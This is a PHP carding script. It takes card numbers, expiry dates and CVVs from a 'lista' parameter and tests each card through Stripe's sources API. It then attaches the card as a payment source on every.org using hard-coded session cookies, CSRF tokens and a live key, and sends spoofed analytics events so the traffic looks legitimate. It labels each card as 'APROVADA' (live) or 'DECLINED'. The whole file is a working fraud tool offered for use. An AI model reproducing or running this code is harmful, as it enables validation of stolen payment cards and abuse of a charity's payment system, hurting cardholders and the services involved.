<?php
$everyApiUrl = 'https://api.www.every.org/api/addPaymentSource';
$everyApiKey = 'client-PJJDmB1e5Tx85UoRFKFrDI1Y7IaK6OW8ilS4oDLiNA';
$stripePublicKey = 'pk_live_a5XJAcVaIqMs8ggZMtluZs8z00r2H4kYVG';

$userData = [
    'userID' => '8c073f44-e327-46f8-8d1c-dba0c0530dc8',
    'stableID' => '7df0efa0-d7ed-4e25-9e16-eade391515fb',
    'abTestingId' => '8c073f44-e327-46f8-8d1c-dba0c0530dc8',
    'csrfToken' => 'UBsQDAKN-jieIp-MWi0HlC3Nx1v6Ebo7R1I4',
    'sessionId' => '52b94a49-bfe5-4c8a-ba6f-6b4efcda0668'
];

$sessionCookies = [
    'everydotorgStableId' => '7df0efa0-d7ed-4e25-9e16-eade391515fb',
    'backendLoginCsrf_v2' => 'W-erjE0m0XRXUzTYpUOUr',
    'backendLoginCsrf_v2.sig' => 'L8V_tS3jexVUgWSb8GgZwHeQZOI',
    'returnFrontendCsrfToken_v2' => 'FHe0kma3zZy67hwQ7kSNa',
    'returnFrontendCsrfToken_v2.sig' => 'IrUQvMjF59E1ct6x1DDAJ9qobaA',
    'trackNewSSOUser_v2' => '73ada2e6-1427-4822-a5ea-1c2e98d244a2',
    'trackNewSSOUser_v2.sig' => 'v2Rfoz7vxyI0wvsAglXTrAuKpXg',
    'koaSess_v2' => '505f4e12-fef3-4583-8916-0dc8eff1ee61',
    'koaSess_v2.sig' => 'vroa_fP4TQAfGcQo-IyIorObUdo',
    'userStatus_v2' => '{"emailVerified":true,"deactivated":false,"profileIncomplete":false}',
    'sessionExists_v2' => '{"createdAt":"2026-03-26T02:38:52.749Z"}'
];

function getCardData() {
    global $argv;
    
    $input = null;
    
    if (php_sapi_name() === 'cli') {
        if (isset($argv[1])) {
            $input = $argv[1];
        }
    } else if (isset($_GET['lista'])) {
        $input = $_GET['lista'];
    }
    
    if (!$input) {
        die("Erro: Nenhum dado fornecido. Use: ?lista=NUMERO|MES|ANO|CVV\n");
    }
    
    $parts = explode('|', $input);
    if (count($parts) < 4) {
        die("Erro: Formato inválido. Use: numero|mes|ano|cvv\n");
    }
    
    return [
        'number' => trim($parts[0]),
        'exp_month' => trim($parts[1]),
        'exp_year' => trim($parts[2]),
        'cvc' => trim($parts[3]),
        'raw_input' => $input,
        'cc' => trim($parts[0]),
        'mes' => trim($parts[1]),
        'ano' => trim($parts[2]),
        'cvv' => trim($parts[3])
    ];
}

function createStripeSource($cardData, $stripePublicKey) {
    $url = 'https://api.stripe.com/v1/sources';
    
    $postData = http_build_query([
        'type' => 'card',
        'usage' => 'reusable',
        'card[number]' => $cardData['number'],
        'card[exp_month]' => $cardData['exp_month'],
        'card[exp_year]' => $cardData['exp_year'],
        'card[cvc]' => $cardData['cvc'],
        'key' => $stripePublicKey,
        'referrer' => 'https://www.every.org',
        'guid' => 'NA',
        'muid' => 'NA',
        'sid' => 'NA'
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode !== 200) {
        $errorResponse = json_decode($response, true);
        $errorMessage = isset($errorResponse['error']['message']) 
            ? $errorResponse['error']['message'] 
            : "Stripe API error: HTTP $httpCode";
        return ['error' => $errorMessage];
    }
    
    $result = json_decode($response, true);
    
    if (isset($result['id']) && strpos($result['id'], 'src_') === 0) {
        return ['source_id' => $result['id']];
    }
    
    return ['error' => 'Invalid Stripe response'];
}

function addPaymentSource($sourceId, $userData, $sessionCookies) {
    global $everyApiUrl;
    
    $payload = json_encode(['paymentSourceId' => $sourceId]);
    
    $cookieString = '';
    foreach ($sessionCookies as $name => $value) {
        $cookieString .= "$name=$value; ";
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $everyApiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Accept: */*',
        'Origin: https://www.every.org',
        'Referer: https://www.every.org/',
        'X-CSRF-Token: ' . $userData['csrfToken'],
        'Cookie: ' . rtrim($cookieString, '; ')
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $responseData = json_decode($response, true);
    
    if ($httpCode >= 400) {
        $errorMessage = isset($responseData['message']) 
            ? $responseData['message'] 
            : (isset($responseData['error']['message']) ? $responseData['error']['message'] : "API error: HTTP $httpCode");
        return ['error' => $errorMessage];
    }
    
    return [
        'http_code' => $httpCode,
        'response' => $responseData
    ];
}

function sendAnalyticsEvent($eventName, $userData) {
    $url = 'https://p.every.org/v1/rgstr';
    $params = http_build_query([
        'k' => 'client-PJJDmB1e5Tx85UoRFKFrDI1Y7IaK6OW8ilS4oDLiNA',
        'st' => 'javascript-client-react',
        'sv' => '3.15.2',
        't' => round(microtime(true) * 1000),
        'sid' => $userData['sessionId'],
        'ec' => '1'
    ]);
    
    $payload = json_encode([
        'events' => [[
            'eventName' => $eventName,
            'metadata' => [
                'landingRouteName' => 'BUILD_PROFILE',
                'entryRouteName' => 'MY_GIVING_PAYMENT',
                'currentRouteName' => 'MY_GIVING_PAYMENT',
                'currentPageName' => 'MY_GIVING_PAYMENT',
                'isLoggedIn' => 'true',
                'currentUserType' => 'VERIFIED'
            ],
            'user' => [
                'userID' => $userData['userID'],
                'customIDs' => ['stableID' => $userData['stableID']],
                'statsigEnvironment' => ['tier' => 'production']
            ],
            'time' => round(microtime(true) * 1000),
            'statsigMetadata' => ['currentPage' => 'https://www.every.org/my-giving/payment']
        ]],
        'statsigMetadata' => [
            'sdkVersion' => '3.15.2',
            'sdkType' => 'javascript-client-react',
            'isRecordingSession' => 'true',
            'stableID' => $userData['stableID'],
            'sessionID' => $userData['sessionId'],
            'fallbackUrl' => null
        ]
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url . '&' . $params);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: text/plain;charset=UTF-8',
        'Origin: https://www.every.org',
        'Referer: https://www.every.org/'
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

$isCli = (php_sapi_name() === 'cli');

if (!$isCli) {
    header('Content-Type: text/plain; charset=utf-8');
}

try {
    $cardData = getCardData();
    
    $stripeResult = createStripeSource($cardData, $stripePublicKey);
    
    if (isset($stripeResult['error'])) {
        $errorMessage = $stripeResult['error'];
        $errorLower = strtolower($errorMessage);
        if (strpos($errorLower, 'security code') !== false && 
            (strpos($errorLower, 'invalid') !== false || strpos($errorLower, 'incorrect') !== false)) {
            echo "✅ APROVADA ➔ {$cardData['cc']}|{$cardData['mes']}|{$cardData['ano']}|{$cardData['cvv']} ➔ cvv incorreto ➔ @WSLZIMMOSILVA";
        } else {
            echo "❌ DECLINED ➔ {$cardData['cc']}|{$cardData['mes']}|{$cardData['ano']}|{$cardData['cvv']} ➔ {$errorMessage} ➔ @WSLZIMMOSILVA";
        }
        exit(1);
    }
    
    $sourceId = $stripeResult['source_id'];
    
    $addResult = addPaymentSource($sourceId, $userData, $sessionCookies);
    
    if (isset($addResult['error'])) {
        $errorMessage = $addResult['error'];
        $errorLower = strtolower($errorMessage);
        if (strpos($errorLower, 'security code') !== false && 
            (strpos($errorLower, 'invalid') !== false || strpos($errorLower, 'incorrect') !== false)) {
            echo "✅ APROVADA ➔ {$cardData['cc']}|{$cardData['mes']}|{$cardData['ano']}|{$cardData['cvv']} ➔ cvv incorreto ➔ @WSLZIMMOSILVA";
        } else {
            echo "❌ DECLINED ➔ {$cardData['cc']}|{$cardData['mes']}|{$cardData['ano']}|{$cardData['cvv']} ➔ {$errorMessage} ➔ @WSLZIMMOSILVA";
        }
        exit(1);
    }
    
    sendAnalyticsEvent('Viewed add credit card form', $userData);
    sendAnalyticsEvent('Click', $userData);
    
    echo "✅ APROVADA ➔ {$cardData['cc']}|{$cardData['mes']}|{$cardData['ano']}|{$cardData['cvv']} ➔ LIVE ✅ ➔ @WSLZIMMOSILVA";
    
} catch (Exception $e) {
    echo "❌ DECLINED ➔ " . (isset($cardData['cc']) ? "{$cardData['cc']}|{$cardData['mes']}|{$cardData['ano']}|{$cardData['cvv']}" : "unknown") . " ➔ {$e->getMessage()} ➔ @WSLZIMMOSILVA";
    exit(1);
}
?>